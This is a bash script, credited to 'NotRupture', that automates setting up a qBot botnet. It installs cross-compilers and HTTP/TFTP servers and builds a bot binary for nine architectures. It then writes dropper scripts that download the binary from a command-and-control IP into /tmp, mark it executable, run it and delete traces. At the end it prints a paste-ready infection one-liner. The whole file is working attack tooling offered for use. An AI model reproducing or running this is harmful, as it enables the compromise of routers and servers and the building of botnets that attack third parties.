#!/bin/bash
# Automated qBot Setup Script
# Written By NotRupture
# Date: 02/04/2016
# *NOTE* Run "apt-get install dos2unix -y" // "yum install dos2unix -y" then "dos2unix FILE.sh"

### File Names ###
wgetsh=""
tftp1=""
tftp2=""
Barm7=""
Bmipsel=""
Bmips=""
Bmips64=""
Bi686=""
Bsparc=""
Bsh4=""
B64=""
Bppc=""
### End Of Section ###


### Function Configuration ###
if [ $# == 0 ]; then
echo "Usage: bash $0 [BOT] [Server IP]"
exit 0
fi

function usage1() {
echo "Usage: bash $0 [BOT] [Server IP]"
echo "Put the bot you are compiling as first argument"
}

function usage2() {
echo "Usage bash $0 [BOT] [Server IP]"
echo "Please add your CnC host IP after the BOT"
}

if [ "$1" ==  "$NULL" ];  then
    usage1
    exit
fi

if [ "$2" == "$NULL" ]; then
    usage2
    exit
fi
### End Of Section ###

read -p "Welcome To @NotRupture's Automated qBot Setup... Press Enter To Continue!"

### Installing Dependencies & Starting Services ###

if [ -f /usr/bin/yum ]; then
echo "Installing Packages..."
echo "ulimit -n 99999; ulimit -u 99999; ulimit -s 99999" >> ~/.bashrc
ulimit -n 99999
ulimit -u 99999
ulimit -s 99999
source ~/.bashrc
yum update -y && yum upgrade -y --skip-broken
yum groupinstall "Development Tools" -y --skip-broken
yum install gcc -y --skip-broken
yum install bzip2 -y --skip-broken
yum install upx -y --skip-broken
yum install tftp -y --skip-broken
yum install tftp-server -y --skip-broken
yum install xinetd -y --skip-broken
yum install apache2 -y --skip-broken
service apache2 restart
service xinetd restart
chkconfig xinetd on
elif [ -f /usr/bin/apt-get ]; then
echo "Installing Packages..."
echo "ulimit -n 99999; ulimit -u 99999; ulimit -s 99999" >> ~/.bashrc
ulimit -n 99999
ulimit -u 99999
ulimit -s 99999
source ~/.bashrc
apt-get update -y && apt-get upgrade -y
apt-get install build-essential -y
apt-get install gcc -y
apt-get install nginx -y
apt-get install upx -y
apt-get install tftp -y
apt-get install tftpd -y
apt-get install tftpd-hpa -y
apt-get install xinetd -y
service nginx start
service xinetd start
service tftpd-hpa start
apt-get install bzip2 -y
fi
### End Of Section ###


### Installing Cross Compilers ###
if [ -d cross-compiler-armv7l ]; then
echo -e "cross-compiler-armv7l is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-armv7l.tar.bz2
tar -xvjf cross-compiler-armv7l.tar.bz2
fi

if [ -d cross-compiler-mipsel ]; then
echo -e "cross-compiler-mipsel is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-mipsel.tar.bz2
tar -xvjf cross-compiler-mipsel.tar.bz2
fi

if [ -d cross-compiler-mips ]; then
echo -e "cross-compiler-mips is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-mips.tar.bz2
tar -xvjf cross-compiler-mips.tar.bz2
fi

if [ -d cross-compiler-mips64 ]; then
echo -e "cross-compiler-mips64 is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-mips64.tar.bz2
tar -xvjf cross-compiler-mips64.tar.bz2
fi

if [ -d cross-compiler-i686 ]; then
echo -e "cross-compiler-i686 is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-i686.tar.bz2
tar -xvjf cross-compiler-i686.tar.bz2
fi

if [ -d cross-compiler-sparc ]; then
echo -e "cross-compiler-sparc is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-sparc.tar.bz2
tar -xvjf cross-compiler-sparc.tar.bz2
fi

if [ -d cross-compiler-sh4 ]; then
echo -e "cross-compiler-sh4 is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-sh4.tar.bz2
tar -xvjf cross-compiler-sh4.tar.bz2
fi

if [ -d cross-compiler-x86_64 ]; then
echo -e "cross-compiler-x86_64 is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-x86_64.tar.bz2
tar -xvjf cross-compiler-x86_64.tar.bz2
fi

if [ -d cross-compiler-powerpc ]; then
echo -e "cross-compiler-powerpc is present"
else
wget http://landley.net/aboriginal/downloads/old/binaries/1.2.6/cross-compiler-powerpc.tar.bz2
tar -xvjf cross-compiler-powerpc.tar.bz2
fi

if [ -d *.tar.bz2 ]; then
echo -e "Removing All .tar.bz2 files"
else
rm -rf *.tar.bz2
fi
### End Of Section ###

echo -en "\n"
echo "Cross Compiling... please wait."

### Cross Compiling Bot ###
if [ -f $Barm7 ]; then
echo -en "arm7 is present // Binary Name: $Barm7\n"
else
./cross-compiler-armv7l/bin/armv7l-gcc -static -lpthread -pthread -Darm7 -o $Barm7 $1 > /dev/null 2>&1
fi

if [ -f $Bmipsel ]; then
echo -en "mipsel is present // Binary Name: $Bmipsel\n"
else
./cross-compiler-mipsel/bin/mipsel-gcc -static -lpthread -pthread -Dmipsel -o $Bmipsel $1 > /dev/null 2>&1
fi

if [ -f $Bmips ]; then
echo -en "mips is present // Binary Name: $Bmips\n"
else
./cross-compiler-mips/bin/mips-gcc -static -lpthread -pthread -Dmips -o $Bmips $1 > /dev/null 2>&1
fi

if [ -f $Bmips64 ]; then
echo -en "mips64 is present // Binary Name: $Bmips64\n"
else
./cross-compiler-mips64/bin/mips64-gcc -static -lpthread -pthread -Dmips64 -o $Bmips64 $1 > /dev/null 2>&1
fi

if [ -f $Bi686 ]; then
echo -en "i686 is present // Binary Name: $Bi686\n"
else
./cross-compiler-i686/bin/i686-gcc -static -lpthread -pthread -Di686 -o $Bi686 $1 > /dev/null 2>&1
fi

if [ -f $Bsparc ]; then
echo -en "sparc is present // Binary Name: $Bsparc\n"
else
./cross-compiler-sparc/bin/sparc-gcc -static -lpthread -pthread -Dsparc -o $Bsparc $1 > /dev/null 2>&1
fi

if [ -f $Bsh4 ]; then
echo -en "sh4 is present // Binary Name: $Bsh4\n"
else
./cross-compiler-sh4/bin/sh4-gcc -static -lpthread -pthread -Dsh4 -o $Bsh4 $1 > /dev/null 2>&1
fi

if [ -f $B64 ]; then
echo -en "x86_64 is present // Binary Name: $B64\n"
else
./cross-compiler-x86_64/bin/x86_64-gcc -static -lpthread -pthread -D64 -o $B64 $1 > /dev/null 2>&1
fi

if [ -f $Bppc ]; then
echo -en "ppc is present // Binary Name: $Bppc\n"
else
./cross-compiler-powerpc/bin/powerpc-gcc -static -lpthread -pthread -Dppc -o $Bppc $1 > /dev/null 2>&1
fi
### End Of Section ###

### Changing Permitions & Moving Files ###
if [ -f /usr/bin/yum ]; then
chmod 777 /var/lib/tftpboot
chmod 777 /var/www/html
cp $Barm7 $Bmipsel $Bmips $Bmips64 $Bi686 $Bsparc $Bsh4 $B64 $Bppc /var/lib/tftpboot
cp $Barm7 $Bmipsel $Bmips $Bmips64 $Bi686 $Bsparc $Bsh4 $B64 $Bppc /var/www/html
touch /var/www/html/$wgetsh
touch /var/lib/tftpboot/$tftp1
touch /var/lib/tftpboot/$tftp2
elif [ -f /usr/bin/apt-get ]; then
chmod 777 /srv/tftp
chmod 777 /usr/share/nginx/www
chmod 777 /usr/share/nginx/html
cp $Barm7 $Bmipsel $Bmips $Bmips64 $Bi686 $Bsparc $Bsh4 $B64 $Bppc /srv/tftp
cp $Barm7 $Bmipsel $Bmips $Bmips64 $Bi686 $Bsparc $Bsh4 $B64 $Bppc /usr/share/nginx/www
cp $Barm7 $Bmipsel $Bmips $Bmips64 $Bi686 $Bsparc $Bsh4 $B64 $Bppc /usr/share/nginx/html
touch /usr/share/nginx/www/$wgetsh
touch /usr/share/nginx/html/$wgetsh
touch /srv/tftp/$tftp1
touch /srv/tftp/$tftp2
fi
### End Of Section ###

### Generating GetBinary.sh ###
if [ -d /usr/share/nginx/html ]; then
echo "ulimit -n 712" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Barm7; chmod 777 $Barm7; ./$Barm7" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bmipsel; chmod 777 $Bmipsel; ./$Bmipsel" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bmips; chmod 777 $Bmips; ./$Bmips" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bmips64; chmod 777 $Bmips64; ./$Bmips64" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bi686; chmod 777 $Bi686; ./$Bi686" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bsparc; chmod 777 $Bsparc; ./$Bsparc" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bsh4; chmod 777 $Bsh4; ./$Bsh4" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$B64; chmod 777 $B64; ./$B64" >>/usr/share/nginx/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bppc; chmod 777 $Bppc; ./$Bppc" >>/usr/share/nginx/html/$wgetsh
elif [ -d /usr/share/nginx/www ]; then
echo "ulimit -n 712" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Barm7; chmod 777 $Barm7; ./$Barm7" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bmipsel; chmod 777 $Bmipsel; ./$Bmipsel" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bmips; chmod 777 $Bmips; ./$Bmips" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bmips64; chmod 777 $Bmips64; ./$Bmips64" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bi686; chmod 777 $Bi686; ./$Bi686" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bsparc; chmod 777 $Bsparc; ./$Bsparc" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bsh4; chmod 777 $Bsh4; ./$Bsh4" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$B64; chmod 777 $B64; ./$B64" >>/usr/share/nginx/www/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bppc; chmod 777 $Bppc; ./$Bppc" >>/usr/share/nginx/www/$wgetsh
fi

if [ -d /var/www/html ]; then
echo "ulimit -n 712" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Barm7; chmod 777 $Barm7; ./$Barm7" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bmipsel; chmod 777 $Bmipsel; ./$Bmipsel" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bmips; chmod 777 $Bmips; ./$Bmips" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bmips64; chmod 777 $Bmips64; ./$Bmips64" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bi686; chmod 777 $Bi686; ./$Bi686" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bsparc; chmod 777 $Bsparc; ./$Bsparc" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bsh4; chmod 777 $Bsh4; ./$Bsh4" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$B64; chmod 777 $B64; ./$B64" >>/var/www/html/$wgetsh
echo "cd /tmp || cd /var/run; rm -rf *; wget http://$2/$Bppc; chmod 777 $Bppc; ./$Bppc" >>/var/www/html/$wgetsh
else
echo "Oops.. Something has gone wrong."
fi

if [ -d /srv/tftp ]; then
echo "ulimit -n 712" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Barm7 -g $2; chmod +x $Barm7; ./$Barm7; rm -rf $Barm7*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bmipsel -g $2; chmod +x $Bmipsel; ./$Bmipsel; rm -rf $Bmipsel*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bmips -g $2; chmod +x $Bmips; ./$Bmips; rm -rf $Bmips*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bmips64 -g $2; chmod +x $Bmips64; ./$Bmips64; rm -rf $Bmips64*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bi686 -g $2; chmod +x $Bi686; ./$Bi686; rm -rf $Bi686*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bsparc -g $2; chmod +x $Bsparc; ./$Bsparc; rm -rf $Bsparc*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bsh4 -g $2; chmod +x $Bsh4; ./$Bsh4; rm -rf $Bsh4*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $B64 -g $2; chmod +x $B64; ./$B64; rm -rf $B64*" >>/srv/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bppc -g $2; chmod +x $Bppc; ./$Bppc; rm -rf $Bppc*" >>/srv/tftp/$tftp1
echo "rm -rf /tmp/*" >>/srv/tftp/$tftp1
echo "ulimit -n 712" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Barm7; chmod +x $Barm7; ./$Barm7; rm -rf $Barm7*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bmipsel; chmod +x $Bmipsel; ./$Bmipsel; rm -rf $Bmipsel*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bmips; chmod +x $Bmips; ./$Bmips; rm -rf $Bmips*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bmips64; chmod +x $Bmips64; ./$Bmips64; rm -rf $Bmips64*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bi686; chmod +x $Bi686; ./$Bi686; rm -rf $Bi686*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bsparc; chmod +x $Bsparc; ./$Bsparc; rm -rf $Bsparc*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bsh4; chmod +x $Bsh4; ./$Bsh4; rm -rf $Bsh4*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $B64; chmod +x $B64; ./$B64; rm -rf $B64*" >>/srv/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bppc; chmod +x $Bppc; ./$Bppc; rm -rf $Bppc*" >>/srv/tftp/$tftp2
echo "rm -rf /tmp/*" >>/srv/tftp/$tftp2
elif [ -d /var/lib/tftp ]; then
echo "ulimit -n 712" >>/var/lib/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Barm7 -g $2; chmod +x $Barm7; ./$Barm7; rm -rf $Barm7*" >>/var/lib/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bmipsel -g $2; chmod +x $Bmipsel; ./$Bmipsel; rm -rf $Bmipsel*" >>/var/lib/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bmips -g $2; chmod +x $Bmips; ./$Bmips; rm -rf $Bmips*" >>/var/lib/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bmips64 -g $2; chmod +x $Bmips64; ./$Bmips64; rm -rf $Bmips64*" >>/var/lib/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bi686 -g $2; chmod +x $Bi686; ./$Bi686; rm -rf $Bi686*" >>/var/lib/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bsparc -g $2; chmod +x $Bsparc; ./$Bsparc; rm -rf $Bsparc*" >>/var/lib/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bsh4 -g $2; chmod +x $Bsh4; ./$Bsh4; rm -rf $Bsh4*" >>/var/lib/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $B64 -g $2; chmod +x $B64; ./$B64; rm -rf $B64*" >>/var/lib/tftp/$tftp1
echo "cd /tmp || cd /var/run; tftp -r $Bppc -g $2; chmod +x $Bppc; ./$Bppc; rm -rf $Bppc*" >>/var/lib/tftp/$tftp1
echo "rm -rf /tmp/*" >>/var/lib/tftp/$tftp1
echo "ulimit -n 712" >>/var/lib/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Barm7; chmod +x $Barm7; ./$Barm7; rm -rf $Barm7*" >>/var/lib/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bmipsel; chmod +x $Bmipsel; ./$Bmipsel; rm -rf $Bmipsel*" >>/var/lib/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bmips; chmod +x $Bmips; ./$Bmips; rm -rf $Bmips*" >>/var/lib/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bmips64; chmod +x $Bmips64; ./$Bmips64; rm -rf $Bmips64*" >>/var/lib/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bi686; chmod +x $Bi686; ./$Bi686; rm -rf $Bi686*" >>/var/lib/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bsparc; chmod +x $Bsparc; ./$Bsparc; rm -rf $Bsparc*" >>/var/lib/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bsh4; chmod +x $Bsh4; ./$Bsh4; rm -rf $Bsh4*" >>/var/lib/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $B64; chmod +x $B64; ./$B64; rm -rf $B64*" >>/var/lib/tftp/$tftp2
echo "cd /tmp || cd /var/run; tftp $2 -c get $Bppc; chmod +x $Bppc; ./$Bppc; rm -rf $Bppc*" >>/var/lib/tftp/$tftp2
echo "rm -rf /tmp/*" >>/var/lib/tftp/$tftp2
### End Of Section ###
clear
echo -en "\n"
echo -e "Your Link: cd /tmp || cd /var/run;wget http://$2/$wgetsh;sh $wgetsh;rm -rf $wgetsh;tftp -r $tftp1 -g $2;sh $tftp1; tftp $2 -c get $tftp2; sh $tftp2; rm -rf $tftp1 $tftp2 $wgetsh"